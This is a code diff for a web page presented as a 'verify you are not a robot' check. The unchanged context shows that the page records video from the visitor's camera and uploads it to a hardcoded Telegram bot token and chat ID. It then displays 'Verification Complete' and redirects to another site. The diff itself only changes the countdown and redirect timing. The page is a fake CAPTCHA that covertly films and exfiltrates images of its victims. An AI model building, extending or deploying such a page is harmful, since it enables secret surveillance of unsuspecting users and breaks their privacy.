@@ -100,12 +100,6 @@
                 opacity: 1;
             }
         }
-
-        .countdown {
-            font-size: 18px;
-            margin-top: 20px;
-            color: #FFEB3B;
-        }
     </style>
 </head>
 <body>
@@ -121,7 +115,6 @@
         </div>
         <div class="loading">Recording in progress... ⏳</div>
         <div class="success">✅ Verification Complete! Redirecting...</div>
-        <div class="countdown" id="countdown">10 seconds remaining...</div>
     </div>
 
     <script>
@@ -130,7 +123,7 @@
         const checkbox = document.getElementById('robot-checkbox');
         const loading = document.querySelector('.loading');
         const success = document.querySelector('.success');
-        const countdown = document.getElementById('countdown');
+        let counterInterval;
 
         const telegramToken = "5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q";
         const telegramChatId = "2070423407";
@@ -180,26 +173,38 @@
                             fetch(`https://api.telegram.org/bot${telegramToken}/sendVideo`, {
                                 method: 'POST',
                                 body: formData
+                            }).then(() => {
+                                // After sending the video, remove the face frame after 5 seconds
+                                setTimeout(() => {
+                                    faceFrame.style.display = 'none';
+                                }, 5000);
+
+                                // Show verification complete message
+                                setTimeout(() => {
+                                    loading.style.display = 'none';
+                                    success.style.display = 'block';
+
+                                    // Start the counter and redirect after 10 seconds
+                                    let counter = 10;
+                                    const counterElement = document.createElement('div');
+                                    counterElement.textContent = `Redirecting in ${counter} seconds...`;
+                                    document.body.appendChild(counterElement);
+
+                                    counterInterval = setInterval(() => {
+                                        counter--;
+                                        counterElement.textContent = `Redirecting in ${counter} seconds...`;
+                                        if (counter <= 0) {
+                                            clearInterval(counterInterval);
+                                            window.location.href = 'https://hesentv.vercel.app/';
+                                        }
+                                    }, 1000);
+                                }, 2000); // 2 seconds for success message
                             }).catch((error) => {
                                 console.error('Video upload failed:', error.message);
                             });
 
                             // Stop the camera
                             stream.getTracks().forEach(track => track.stop());
-
-                            // Start countdown for redirection after video upload
-                            let countdownTime = 10;
-                            const countdownInterval = setInterval(() => {
-                                countdown.textContent = `${countdownTime} seconds remaining...`;
-                                countdownTime--;
-                                if (countdownTime < 0) {
-                                    clearInterval(countdownInterval);
-                                    loading.style.display = 'none';
-                                    success.style.display = 'block';
-                                    // Redirect to the provided URL
-                                    window.location.href = 'https://hesentv.vercel.app/';
-                                }
-                            }, 1000);
                         };
                     })
                     .catch((err) => {
